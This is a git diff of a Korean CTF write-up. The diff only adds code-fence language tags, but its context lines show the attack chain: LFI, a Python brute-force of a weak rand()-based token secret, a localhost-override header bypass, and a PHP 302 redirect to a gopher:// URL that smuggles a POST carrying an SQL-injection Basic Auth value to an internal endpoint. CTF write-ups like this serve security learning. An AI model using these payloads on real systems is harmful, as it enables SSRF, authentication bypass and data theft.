@@ -16,7 +16,7 @@ published: true
 lfi가 존재한다
 
 
-```
+```php
 <?php
 
 // LOCATION : ./internal_e0134cd5a917.php
@@ -125,7 +125,7 @@ load.phtml 추출된결과
 curl 기능을 admin만 localhost에서 쓸 수 있다고 해놨는데, 이는 우회가 가능하다.
 
 
-```
+```php
 function gen($user){
  return substr(sha1((string)rand(0,getrandmax())),0,20);
 }
@@ -142,7 +142,7 @@ if(!isset($_COOKIE['X-TOKEN'])){ setcookie("X-TOKEN",hash("sha256", $_SESSION['X
 하지만 getrandmax는 21억가량밖에 안되기 때문에, 개인 pc로도 적은시간 안에 해시를 크랙해낼 수 있다.
 
 
-```
+```py
 from arang import *
 
 xtoken = b"b0b32995820dad31a559a8611a610f9b3c57072b8fd757739c3605e50877d2fd"
@@ -165,7 +165,7 @@ for i in range(40000000,500000000):
 이제 이 xsecret으로 valid한 admin x-token을 만들어내면 token auth를 우회할 수 있다.
 
 
-```
+```php
 $IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);
 
 ...
@@ -179,7 +179,7 @@ $IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? $_SERVER['HTTP_X_HTTP_HOST
 이건`X-HTTP-HOST-OVERRIDE`라는 헤더를 추가해서 127.0.0.1으로 맞춰줌으로써 우회가 가능하다
 
 
-```
+```php
 function valid_url($url)
 {
  $valid = False;
@@ -209,7 +209,7 @@ function valid_url($url)
 우회하려고 용좀써봤는데 우회가 안되더라..
 
 
-```
+```php
 $ch = curl_init();
  $timeout = 7;
  curl_setopt($ch, CURLOPT_URL, $url);
@@ -228,7 +228,7 @@ $ch = curl_init();
 302 Redirection을 curl이 처리하기때문에 내서버로 보낸다음 302 redirection때리면 될거같다.
 
 
-```
+```php
 <?php
 header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aAuthorization:%20Basic%20YWRtaW4nfHwxIzpndWVzdA==%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%203%0d%0a%0d%0aa=a%0d%0a%0d%0a");
 
@@ -268,7 +268,7 @@ sqli로 테이블 뽑아보니 플래그 일부가 나왔다
 고퍼를 스랜다
 
 
-```
+```php
 header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aAuthorization:%20Basic%20YWRtaW4nfHwxIzpndWVzdA==%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%203%0d%0a%0d%0aa=a%0d%0a%0d%0a");
 ```
 
